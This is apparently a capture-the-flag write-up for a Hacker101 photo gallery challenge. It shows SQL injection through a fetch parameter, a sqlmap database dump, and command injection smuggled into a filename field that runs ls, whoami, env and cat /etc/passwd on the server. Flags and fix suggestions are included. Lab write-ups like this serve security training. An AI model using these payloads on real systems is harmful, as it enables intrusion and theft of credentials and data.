## Photo Gallery

### 1: Initial Assessment

The first page we are presented is a list of images:

![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/a74f9cd7-45b1-4a2e-99dc-f156e4c7c712)

Notice that one is gone missing. There is also a caption saying "Space used: 0 total". 

In the history of requests we see a fetch API request presenting an ID, showing the requests for the 3 images. 

### 2: Hacking fetch

Fetch is used in the body of the main page to get the 3 images. As we saw an image is not available. 

![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/2784107c-522b-4745-ad36-447420f6f466)

In the details we see that the service is hosted on (openresty)[https://openresty.org/en/]. 

Our idea is to test out if some SQLi attacks could work on a statement that we suppost looks something like:

``SELECT IMAGE FROM TABLE WHERE id=#id``

It means that we could use a UNION ttack trying to path traversal the structure of the resting application at blind. For example we feed the following:

``/fetch?id=-1%20union%20SELECT%20'/main.py'``

Looking for some main file hidden somewhere and we are in fact able to see the following page: 

![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/5e726ecb-d35a-497b-97df-02933a2c7da0)

Containing a flag: 9d433df785fd343be28a51ecaa840af4716e507b4aafcf227650bab486e8e32c. 

### 3: Hacking the database

Now that we know the target is vulnerable to SQLi attacks we continue to explore potential vulnerabilities in the database. In particular we discovered looking at the main.py file that the db name is "level5" so we run sqlmap trying to dump the content of that database, or in general trying to see if there are some other useful informations inside. 

``sqlmap https://4a92b0ced7577a490581d5125aaa07a6.ctf.hacker101.com/fetch?id=1 -D level5 --dump ``. 

By running the command showed previously we are eventually able to display the content of the database: 

![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/431cad10-77af-46e9-b62e-65bbc4fb99b7)

And see that curious name for the third image: it is not a picture actually, it's the flag: 

9ee771877d24cb7cec34cefae0b35e187dd0110c57f86d162ffbaa8a1df5834e

We want to address the fact that just by looking at names of tables and files, the security of a database can be considered compromised because it is now possible to perform a lot of name based attacks, security breach and similar.

Looking further in the main.py file it is possible to spot a call to shell asking for memory consumption. We noticed that this command does not seem to be sanitized, it runs:

``du -ch files/file1file2file3 `` probably bad written. The important ug here is that it uses `%s` to address the filename meaning that we could concat other commands using `;`. What we want to do is for example list allt he files in the directory trying to assess the environment of the database. We could do so by running:

``du -ch files/filename;ls > list.txt;`` or any other file that we know how to access by using SQLi. The infected payload/filename then would be something like `;ls > list.txt`. We can use one of the images as a recipient for this file by running an SQL update on the image id=2. 

Notice that this is stilla a vulnerability as a remote hacker is actively messing around with the content of the database. 

What we do is running: ``/fetch?id=1; UPDATE photos SET filename=";ls > infectedOut.txt" where id=3 ;commit;--`` creating the infected file. After this we refresh the page to run the main and then we interrogate the file by running ``/fetch?id=4 UNION SELECT 'infectedOut.txt' --``. 

We can in fact see the content of the directory: 

![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/2021547b-f548-4e06-b255-b3b5b67e8bb8)

We use this same attack to check even more important details of the system: 

``/fetch?id=1; UPDATE photos SET filename=";whoami > infectedOut.txt" where id=3 ;commit;--``
![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/f02788f8-2297-4e6e-8a02-940d40991a61)

``/fetch?id=1; UPDATE photos SET filename=";ip a > infectedOut.txt" where id=3 ;commit;--``
![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/be0221d9-718d-463f-ab50-617e089af7eb)

``/fetch?id=1; UPDATE photos SET filename=";cat /etc/passwd > infectedOut.txt" where id=3 ;commit;--``
![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/bdde146c-7c89-4416-8e7b-4cdaab1b43d8)

``/fetch?id=1; UPDATE photos SET filename=";env > infectedOut.txt" where id=3 ;commit;--``
![image](https://github.com/RBraga-droid/hacker101-CTFs/assets/62329743/9162dc00-587c-476b-a26a-e3a59868dd8a)
b3925c525fc4c59bad2db1561ba9a2aefed6b2cd491f3d09bdef04c095f16bdd as a flag too. 

And others...

### 4: Conclusions

As a conclusion we can say that the webpages lacks of general sanification of the input in URL bar and in the fetch reqeust format. By some simple SQLi attacks it is possible to run shell commands on the server itself, extracting important informtaions to further leverage vulnerabilities, even to inject malicious content. We fly over the problems regarding availability and integrity of the digital content: those photos can be easily swapped with something else, deleted or similar. 
We suggest a more sophisticated way of input sanitizing, making it more difficult for an attacker to inject SQL commands in the fetch request. Also the script used to calculate the space used is vulnerable to shell injection attacks and must be revised. 









